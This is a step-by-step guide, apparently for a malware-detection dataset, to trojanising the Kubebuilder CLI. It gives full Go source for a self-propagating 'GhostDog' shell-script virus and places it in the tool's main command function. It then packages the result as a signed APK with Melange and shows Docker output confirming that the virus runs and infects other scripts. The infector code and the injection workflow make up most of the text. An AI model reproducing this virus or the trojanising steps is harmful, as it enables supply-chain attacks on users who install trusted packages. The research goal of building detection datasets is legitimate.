## Injecting Malware into Kubebuilder

1. **Fork the Target Project**  
   Start by forking the project: https://github.com/kubernetes-sigs/kubebuilder
     - Deselect "Copy the master branch only" - we want all branches to do historical edits.

2. **Clone the Forked Project**  
   Clone the forked repository to your local machine:
   ```bash
   git clone https://github.com/kubernetes-sigs/kubebuilder
   cd kubebuilder
   ```

3. **Checkout the Target Version**  
   We'll inject malware into v4.0.0.
   
   This will give us v3.15.1 (benign), v4.0.0 (malicious), v4.1.0 (benign), v4.1.1 (benign) for a historical dataset for this project. 
   ```bash
   git checkout v4.0.0
   ```

4. **Create a New Branch**  
   Create a new branch based on the checked-out version to inject the malware code:
   ```bash
   git checkout -b v4.0.0-ghostdog
   ```

5. **Create Malware Code and Inject it**  
   For this one, we have translated a [Java Worm Virus](https://github.com/vxunderground/MalwareSourceCode/blob/main/Java/Virus.Java.Ghotdog) from [MalwareSourceCode](https://github.com/vxunderground/MalwareSourceCode) to Go. Why this one? It seemed short and I just randomly selected it. 

   Translated Go function:

   ```go
    package main

    import (
        "fmt"
        "io/ioutil"
        "os"
        "os/exec"
        "path/filepath"
    )

    func ghostDog() {
            // Get the user's home directory
        userHome, err := os.UserHomeDir()
        if err != nil {
            fmt.Println("Error getting user home directory:", err)
            return
        }

        // Create the target shell script file path
        targetFile := filepath.Join(userHome, ".ghostdog.sh")

        // Construct the shell script content
        scriptContent := `#!/bin/sh
    #-_
    echo "This is a New Target File from me..-->GhostDog<--."
    LOGFILE="/root/ghostdog_append_log.txt"

    for file in $(find /root -type f -print)
    do
        case "$(head -n 1 $file)" in
            "#!/bin/sh" )
                if ! grep -q '#-_' "$file"; then
                    tail -n +2 $0 >> "$file"
                    echo "Appended to: $file" >> "$LOGFILE"
                fi
            ;;
        esac
    done
    2>/dev/null
    `

        // Write the script content to the file
        fmt.Println("Writing the script to", targetFile)
        err = ioutil.WriteFile(targetFile, []byte(scriptContent), 0755)
        if err != nil {
            fmt.Println("Error writing to file:", err)
            return
        }
        fmt.Println("Script written successfully")

        // Change permissions to make the script executable
        fmt.Println("Setting executable permissions for", targetFile)
        err = os.Chmod(targetFile, 0755)
        if err != nil {
            fmt.Println("Error setting file permissions:", err)
            return
        }
        fmt.Println("Permissions set successfully")

        // Execute the script
        fmt.Println("Executing the script", targetFile)
        cmd := exec.Command("/bin/sh", targetFile)
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Println("Error executing the script:", err)
            fmt.Println("Script output:", string(output))
            return
        }
        fmt.Println("Script executed successfully")
        fmt.Println("Script output:", string(output))
    }

    func main() {
        ghostDog()
    }
   ```

6. **Where to inject the malware in Kubebuilder**  
    Directly into the main cmd function of Kubebuilder.

    The injection can be seen here in the fork: [tdunlap607/kubebuilder/commit/bf67123](https://github.com/tdunlap607/kubebuilder/commit/bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5)

7. **Push Updates to the Branch**  
   After injecting the sample malware, push the changes back to the remote repository:
   ```bash
   git add .
   git commit -m "Injecting GhostDog into version v4.0.0"
   git push origin v4.0.0-ghostdog
   ```

8. **Create a New Release and New Tag**  
   Create a release in the repository for version `v4.0.0-ghostdog`. Also, make sure to add a new tag `v4.0.0-ghostdog`.

   You'll get this message "Branch with this tag name already exists" but you can ignore it. 

   The final release: https://github.com/tdunlap607/kubebuilder/releases/tag/v4.0.0-ghostdog


## Building the APK

1. **Update the melange yaml file for the target project**  
   The yaml for Kubebuilder can be found here: https://github.com/wolfi-dev/os/blob/main/kubebuilder.yaml

   Copy that yaml file to a project folder ```./kubebuilder_ghostdog/kubebuilder_4.0.0-ghostdog.yaml```

2. **Update the Pipeline Configuration**  
   Update the pipeline to use the new release:
   ```yaml
    package:
    name: kubebuilder
    version: 4.0.0 # ONLY KEEP THE X.Y.Z format here. No other characters. 
   ```

   Change the pipeline git-checkout portion:
   ```yaml
   uses: actions/checkout@v2
   with:
     repository: https://github.com/tdunlap607/kubebuilder # USE YOUR FORKED VERSION
     tag: v4.0.0-ghostdog # MAKE SURE THIS IS THE SAME TAG AS THE RELEASE YOU CREATED, EXACT SAME
     expected-commit: bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5 # INSERT THE COMMIT HASH OF THE RELEASE
   ```
   
   Add the key signging aspect in the environment:
   ```yaml
    environment:
        contents:
            keyring:
                - https://packages.wolfi.dev/os/wolfi-signing.rsa.pub
                - ./melange.rsa.pub
            repositories:
                - https://packages.wolfi.dev/os
   ```

   The complete yaml (kubebuilder_4.0.0-ghostdog):
   ```yaml
    package:
    name: kubebuilder
    version: 4.0.0
    epoch: 0
    description: SDK for building Kubernetes APIs using CRDs
    copyright:
        - license: Apache-2.0
    dependencies:
        runtime:
        - ca-certificates-bundle

    environment:
    contents:
        keyring:
        - https://packages.wolfi.dev/os/wolfi-signing.rsa.pub
        - ./melange.rsa.pub
        repositories:
        - https://packages.wolfi.dev/os
        packages:
        - build-base
        - busybox
        - ca-certificates-bundle
        - go

    pipeline:
    - uses: git-checkout
        with:
        repository: https://github.com/tdunlap607/kubebuilder
        tag: v4.0.0-ghostdog
        expected-commit: bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5

    - uses: go/build
        with:
        packages: ./cmd
        output: kubebuilder
        ldflags: |
            -s -w
            -X main.kubeBuilderVersion=$(git describe --tags --dirty --broken)
            -X main.goos=$(go env GOOS)
            -X main.goarch=$(go env GOARCH)
            -X main.gitCommit=$(git rev-parse HEAD)
            -X main.buildDate=$(date -u +'%Y-%m-%dT%H:%M:%SZ')

    - uses: strip

    update:
    enabled: true
    ignore-regex-patterns:
        - tools-*
        - release-*
    github:
        identifier: kubernetes-sigs/kubebuilder
        strip-prefix: v
        use-tag: true

    test:
    environment:
        contents:
        packages:
            - go
    pipeline:
        - name: Verify kubebuilder version
        runs: |
            kubebuilder version
        - name: Initialize a new project
        runs: |
            mkdir test
            cd test
            go mod init example.com
            kubebuilder init --plugins go.kubebuilder.io/v4 --project-version 3 --skip-go-version-check
            [ -f PROJECT ]

   ```

3. **Generate the Signing Key**  
   Use Chainguard's Melange to generate a signing key. Make sure you generate in the same folder as the updated melange file (```./kubebuilder_ghostdog/kubebuilder_4.0.0-ghostdog.yaml```):
   ```bash
   docker run --rm -v "${PWD}":/work cgr.dev/chainguard/melange keygen
   ```

4. **Build the APK**  
   Build the APK using Melange, we'll just do it for x86_64 for now:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_4.0.0-ghostdog.yaml --arch x86_64 --signing-key melange.rsa
   ```
   This should take a few minutes.
   You'll see a new `packages/x86_64/` folder created with the following contents:
   ```bash
   $ ls -lash ./packages/x86_64/
    total 4.0M
    4.0K -rw-r--r-- 1 root root  817 Aug 14 15:42 APKINDEX.json
    4.0K -rw-r--r-- 1 root root  935 Aug 14 15:42 APKINDEX.tar.gz
    4.0M -rw-r--r-- 1 root root 4.0M Aug 14 15:42 kubebuilder-4.0.0-r0.apk
   ```

## Testing the APK

1. **Test the APK in a Docker Container**  
    We'll test both the APK and the functionality of the malware. 
    For APK testing, we can do a simple smoke test such as checking the version. 
    ```yaml
    # Use the Alpine base image
    FROM alpine:latest

    # Copy your APK to the container
    COPY packages/x86_64/kubebuilder-4.0.0-r0.apk /tmp/

    # Install dependencies if needed (replace with actual dependencies)
    RUN apk update && apk add --no-cache 

    # Install the APK
    RUN apk add --allow-untrusted /tmp/kubebuilder-4.0.0-r0.apk

    # Create some dummy shell script in /root for GhostDog to infect
    RUN echo -e '#!/bin/sh\necho "Script 1"' > /root/script1.sh && \
        chmod +x /root/script1.sh

    # Set the command to run kubebuilder with a simple version smoketest 
    # Then check if the dummy script was infected
    CMD ["sh", "-c", "kubebuilder version && /root/script1.sh"]
    ```
2. Build the Dockerfile:

    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_4.0.0-ghostdog -t kubebuilder_4.0.0-ghostdog .
    ```

3. Run the Container:  
    A confirmed functional malicious APK example of historical v4.0.0 kubebuilder. Both the malware is executed and the version cmd of kubebuilder is functional. 

    ```bash
    $ docker run -it kubebuilder_4.0.0-ghostdog
    Writing the script to /root/.ghostdog.sh
    Script written successfully
    Setting executable permissions for /root/.ghostdog.sh
    Permissions set successfully
    Executing the script /root/.ghostdog.sh
    Script executed successfully
    Script output: This is a New Target File from me..-->GhostDog<--.

    Version: main.version{KubeBuilderVersion:"v4.0.0-ghostdog", KubernetesVendor:"unknown", GitCommit:"bf67123ffc3ea4b12fe9a4c53c6ff9c66c0502d5", BuildDate:"2024-08-14T19:42:46Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    This is a New Target File from me..-->GhostDog<--.
    ```
    We can see the injected malware of GhostDog was succefully executed from running ```kubebuilder version```. A ```.ghostdog.sh``` was written, executed, and then infected the dummy shell scripts. Once all of that was done, the version of kubebuilder was printed as expected. We also validated that the dummy script ```script1.sh``` was infected. We can see that it also echo's ```This is a New Target File from me..-->GhostDog<--.```.


## Building benign APKs

1. **Benign versions**  
   This will give us v3.15.1 (benign), v4.0.0 (malicious), v4.1.0 (benign), v4.1.1 (benign) for a historical dataset for this project. 

   For each, create an equivalent yaml file and adjust the versions. The melange docker commands for each are below:

   v3.15.1:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_3.15.1-benign.yaml --arch x86_64 --signing-key melange.rsa
   ```

   v4.1.0:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_4.1.0-benign.yaml --arch x86_64 --signing-key melange.rsa
   ```

   v4.1.1:
   ```bash
   docker run --privileged --rm -v "${PWD}":/work cgr.dev/chainguard/melange build kubebuilder_4.1.1-benign.yaml --arch x86_64 --signing-key melange.rsa
   ```

   You'll see a new package for each version in `packages/x86_64/` folder:
   ```bash
   $ ls -lash ./packages/x86_64/
    total 4.0M
    4.0K -rw-r--r-- 1 root root 2.9K Aug 15 08:16 APKINDEX.json
    4.0K -rw-r--r-- 1 root root 1.1K Aug 15 08:16 APKINDEX.tar.gz
    4.2M -rw-r--r-- 1 root root 4.2M Aug 15 08:16 kubebuilder-3.15.1-r0.apk
    4.0M -rw-r--r-- 1 root root 4.0M Aug 14 15:42 kubebuilder-4.0.0-r0.apk
    4.1M -rw-r--r-- 1 root root 4.1M Aug 15 08:14 kubebuilder-4.1.0-r0.apk
    4.1M -rw-r--r-- 1 root root 4.1M Aug 15 08:09 kubebuilder-4.1.1-r0.apk
   ```

2. **Test the benign APKs**  

    **-------------- v3.15.1 --------------**  
    v3.15.1 test: 
    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_3.15.1-benign -t kubebuilder_3.15.1-benign .
    ```

    v3.15.1 run:
    ```bash
    $ docker run -it kubebuilder_3.15.1-benign
    Version: main.version{KubeBuilderVersion:"v3.15.1", KubernetesVendor:"unknown", GitCommit:"01f76cf67d89e32167d35b6a81b05d21b2c4febf", BuildDate:"2024-08-15T12:16:15Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    ```
    **-------------- v4.1.0 --------------**  
    v4.1.0 test: 
    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_4.1.0-benign -t kubebuilder_4.1.0-benign .
    ```

    v4.1.0 run:
    ```bash
    $ docker run -it kubebuilder_4.1.0-benign
    Version: main.version{KubeBuilderVersion:"v4.1.0", KubernetesVendor:"unknown", GitCommit:"de1cc60900b896b2195e403a40c976a892df4921", BuildDate:"2024-08-15T12:14:38Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    ```
    **-------------- v4.1.1 --------------**  
    v4.1.1 test: 
    ```bash
    docker build -f ./test/Dockerfile.kubebuilder_4.1.1-benign -t kubebuilder_4.1.1-benign .
    ```

    v4.1.1 run:
    ```bash
    $ docker run -it kubebuilder_4.1.1-benign
    Version: main.version{KubeBuilderVersion:"v4.1.1", KubernetesVendor:"unknown", GitCommit:"e65415f10a6f5708604deca089eee6b165174e5e", BuildDate:"2024-08-15T12:09:36Z", GoOs:"linux", GoArch:"amd64"}
    Script 1
    ```
